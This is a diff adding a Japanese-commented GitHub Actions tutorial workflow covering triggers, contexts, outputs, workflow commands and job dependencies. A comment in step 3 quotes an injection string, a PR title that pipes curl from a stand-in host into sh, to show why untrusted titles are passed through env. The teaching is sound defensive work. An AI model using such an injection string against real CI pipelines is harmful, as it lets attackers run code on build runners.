@@ -1,0 +1,197 @@
+# =============================================================================
+# 01-basics.yml  ― 【STEP 1 / 初級】GitHub Actions の基礎文法を一通り体験する
+# =============================================================================
+# 学習カリキュラム (このリポジトリの workflow は番号順に難しくなる)
+#   01-basics    : トリガー / コンテキスト / 環境変数 / 出力 / 条件分岐 / サマリー  <- いまここ
+#   02-ci        : matrix / キャッシュ / 成果物 / concurrency / 再利用ワークフロー
+#   03-pr-review : github-script で PR をレビューし、コメントと Issue を自動作成
+#   (次の段階)   : Claude Code GitHub Action (AI レビュー) へ
+#
+# この workflow は「何かを成し遂げる」ためではなく、
+# Actions の部品の動きを実行ログで観察して理解するためのものです。
+# Actions タブで実行結果を開き、各ステップのログと見比べながら読んでください。
+# =============================================================================
+
+# ワークフロー名。Actions タブの左側一覧に表示される。
+name: 01 Basics
+
+# 実行ごとの表示名 (省略可)。式 ${{ }} が使える。「誰が・何で起動したか」が一覧で分かって便利。
+run-name: "01 Basics (${{ github.event_name }}) by @${{ github.actor }}"
+
+# -----------------------------------------------------------------------------
+# on: いつ実行するか (トリガー)
+# -----------------------------------------------------------------------------
+on:
+  # PR のイベント。types を省略すると [opened, synchronize, reopened] がデフォルト。
+  #   opened       : PR を作成した
+  #   synchronize  : PR のブランチに新しい push があった
+  #   reopened     : 閉じた PR を再度開いた
+  #   ready_for_review : Draft を「Ready for review」にした
+  pull_request:
+    types: [opened, synchronize, reopened, ready_for_review]
+    branches: [main] # main 向けの PR のみ
+
+  # main への push (マージ含む)
+  push:
+    branches: [main]
+
+  # Actions タブの「Run workflow」ボタンから手動実行できるようにする
+  workflow_dispatch:
+    inputs:
+      name:
+        description: "挨拶する相手の名前 (手動実行時のみ使われる)"
+        type: string
+        default: "GitHub Actions"
+        required: true
+
+# -----------------------------------------------------------------------------
+# permissions: GITHUB_TOKEN に与える権限 (最小権限の原則)
+# -----------------------------------------------------------------------------
+# 指定しないとリポジトリ設定のデフォルト権限になり、広すぎることがある。
+# 「必要なものだけ」を明示するのがセキュリティの基本。
+# ここでは checkout でコードを読むだけなので read で十分。
+permissions:
+  contents: read
+
+# -----------------------------------------------------------------------------
+# env: ワークフロー全体で使える環境変数
+# -----------------------------------------------------------------------------
+# env は3か所に書ける: workflow 全体 / job / step。内側が優先される。
+env:
+  GREETING: "こんにちは"
+
+jobs:
+  # ---------------------------------------------------------------------------
+  # job 1: コンテキストを観察する
+  # ---------------------------------------------------------------------------
+  # job は既定で「並列」に動く。それぞれが別の新しい仮想マシンで動くため、
+  # job 同士でファイルや環境変数は共有されない (値の受け渡しは outputs を使う)。
+  context-tour:
+    name: コンテキストを観察する # UI に表示される job 名
+    runs-on: ubuntu-latest # 実行環境 (GitHub が用意する Ubuntu の仮想マシン)
+    timeout-minutes: 5 # 暴走防止。デフォルトは 360 分もあるので必ず短く設定する
+
+    # job の outputs: 他の job (needs で依存した job) へ値を渡す仕組み。
+    # 値は step の outputs から取る。
+    outputs:
+      short_sha: ${{ steps.vars.outputs.short_sha }}
+
+    steps:
+      # ---- step 1: リポジトリのコードを取得 ----
+      # 仮想マシンは空っぽなので、コードを使うなら最初に checkout が必要。
+      # `uses:` は「他の人が作った再利用可能な部品 (action)」を呼び出す。
+      # @v4 はバージョン。セキュリティを高めるなら、コミット SHA で固定するのが最も安全。
+      - name: コードを取得
+        uses: actions/checkout@v4
+
+      # ---- step 2: コンテキストと環境変数を表示 ----
+      # `run:` はシェルコマンドを実行する。 `|` で複数行を書ける。
+      #
+      # ${{ ... }} は「式」。YAML が解釈される時点 (= シェル実行前) に値へ置換される。
+      # 主なコンテキスト:
+      #   github.*  : イベント・リポジトリ・実行者の情報
+      #   env.*     : 環境変数
+      #   steps.*   : 前の step の出力・結果
+      #   needs.*   : 依存する job の出力・結果
+      #   secrets.* : 暗号化された秘密情報
+      #   runner.*  : 実行環境の情報
+      - name: コンテキストを表示
+        env: # step 単位の環境変数
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+        run: |
+          echo "${GREETING}! (環境変数 GREETING は workflow の env から)"
+          echo "イベント     : ${{ github.event_name }}"
+          echo "ブランチ     : ${{ github.ref_name }}"
+          echo "コミット SHA : ${{ github.sha }}"
+          echo "実行者       : ${{ github.actor }}"
+          echo "リポジトリ   : ${{ github.repository }}"
+          echo "OS           : ${{ runner.os }}"
+          echo "PR 番号      : ${PR_NUMBER:-(PR ではありません)}"
+
+      # ---- step 3: ★セキュリティの重要ポイント: 式インジェクション ----
+      # PR のタイトルやブランチ名は「外部の人が自由に書ける文字列」。
+      #
+      #   ❌ 危険な書き方 (絶対にやらない)
+      #     run: echo "${{ github.event.pull_request.title }}"
+      #     -> タイトルが  "; curl evil.example | sh; "  だと、そのままシェルコマンドとして実行されてしまう。
+      #        ${{ }} はシェルが動く「前」に文字列置換されるため。
+      #
+      #   ✅ 安全な書き方: いったん env に入れ、シェル変数として参照する
+      #     シェル変数の中身は「ただの文字列」として扱われ、コマンドとして解釈されない。
+      - name: PR タイトルを安全に表示
+        if: github.event_name == 'pull_request' # 条件分岐。false なら step ごとスキップされる
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
+        run: |
+          echo "PR タイトル: ${PR_TITLE}"
+
+      # ---- step 4: step の出力 (outputs) を作る ----
+      # $GITHUB_OUTPUT ファイルに「キー=値」を追記すると、後続 step から参照できる。
+      # (古い `::set-output` 構文は廃止されたので使わない)
+      - name: 短い SHA を作る
+        id: vars # id を付けると steps.vars.outputs.xxx で参照できる
+        run: |
+          SHORT_SHA="$(echo "${GITHUB_SHA}" | cut -c1-7)"
+          echo "short_sha=${SHORT_SHA}" >> "$GITHUB_OUTPUT"
+
+      - name: 出力を使う
+        run: echo "短い SHA は ${{ steps.vars.outputs.short_sha }} です"
+
+      # ---- step 5: ログを見やすくする「ワークフローコマンド」 ----
+      # 特定の書式で標準出力に書くと、Actions が特別な意味に解釈してくれる。
+      - name: ワークフローコマンドの例
+        run: |
+          echo "::group::折りたたみ可能なログ (クリックで開く)"
+          echo "長いログをここにまとめておくと読みやすい"
+          echo "::endgroup::"
+          echo "::notice title=お知らせ::これは notice です (青)"
+          echo "::warning title=注意::これは warning です (黄)。ジョブは失敗しない"
+          # ::error:: は赤で表示されるが、それ自体ではジョブを失敗させない (失敗は終了コード != 0)
+          echo "::error title=エラー表示::これは error の表示です (ジョブは失敗しない)"
+
+      # ---- step 6: ジョブサマリー ----
+      # $GITHUB_STEP_SUMMARY に Markdown を書くと、実行結果ページの下部に整形表示される。
+      - name: サマリーを書く
+        run: |
+          {
+            echo "## 01 Basics の実行結果"
+            echo ""
+            echo "| 項目 | 値 |"
+            echo "| --- | --- |"
+            echo "| イベント | \`${{ github.event_name }}\` |"
+            echo "| 短い SHA | \`${{ steps.vars.outputs.short_sha }}\` |"
+          } >> "$GITHUB_STEP_SUMMARY"
+
+  # ---------------------------------------------------------------------------
+  # job 2: 別の job を「後」に実行する (needs と outputs)
+  # ---------------------------------------------------------------------------
+  report:
+    name: 結果を受け取る
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+
+    # needs: この job は context-tour が終わってから動く (直列になる)。
+    # needs に書いた job が失敗すると、この job は自動でスキップされる。
+    needs: context-tour
+
+    # if: always() を付けると、前の job が失敗/スキップでも実行される。
+    # 他の状態関数: success() (既定) / failure() / cancelled()
+    if: always()
+
+    steps:
+      - name: 前の job の結果と出力を使う
+        env:
+          # needs.<job名>.result  : success / failure / cancelled / skipped
+          # needs.<job名>.outputs : 前の job の outputs で定義した値
+          RESULT: ${{ needs.context-tour.result }}
+          SHORT_SHA: ${{ needs.context-tour.outputs.short_sha }}
+        run: |
+          echo "context-tour の結果: ${RESULT}"
+          echo "引き継いだ短い SHA : ${SHORT_SHA}"
+
+      # 手動実行 (workflow_dispatch) のときだけ、入力値を使う
+      - name: 手動実行の入力を使う
+        if: github.event_name == 'workflow_dispatch'
+        env:
+          INPUT_NAME: ${{ inputs.name }} # inputs.* は workflow_dispatch の入力値
+        run: echo "${GREETING}、${INPUT_NAME} さん!"
